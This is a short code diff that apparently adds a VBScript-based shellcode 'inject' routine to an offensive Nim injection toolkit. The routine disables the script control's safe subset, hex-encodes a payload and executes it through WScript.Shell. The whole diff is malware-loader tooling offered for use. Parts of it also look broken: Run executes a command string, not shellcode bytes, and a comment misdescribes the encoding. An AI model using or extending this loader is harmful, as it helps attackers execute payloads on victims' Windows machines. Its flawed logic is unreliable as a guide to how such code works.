@@ -156,3 +156,37 @@ when defined(USE_SETTHREADCONTEXT):
         # echo "[SETCONTEXT] New Context: ", repr(context)
         echo "[SETCONTEXT] New Context: ", context.Rip
         SetThreadContext(thread, addr(context))
+
+when defined(USE_VBSCRIPT):
+    import strformat
+    import system
+    import winim/com
+
+    when defined(amd64):
+        echo "[VBSCRIPT EXECUTION] only supports windows i386 version"
+        quit(1)
+
+    proc inject*[I, T](shellcode: array[I, T]): void {.inline.} =
+        var obj = CreateObject("MSScriptControl.ScriptControl")
+        obj.allowUI = true
+        obj.useSafeSubset = false
+
+        obj.language = "VBScript"
+        var buffer = ""
+        for i in shellcode:
+            #makes the shellcode into space seperated hex values for VBSCRIPT to parse
+            buffer.add(fmt"{i:02X}")
+        var vbs = fmt"""
+            Dim shellcode
+            shellcode = "{$buffer}"
+            Dim buffer
+            buffer = ""
+            For i = 1 To Len(shellcode) Step 2
+                buffer = buffer & Chr(CByte("&H" & Mid(shellcode, i, 2)))
+            Next
+            Dim exec
+            Set exec = WScript.CreateObject("WScript.Shell")
+            exec.Run buffer
+        """
+
+        obj.eval(vbs)
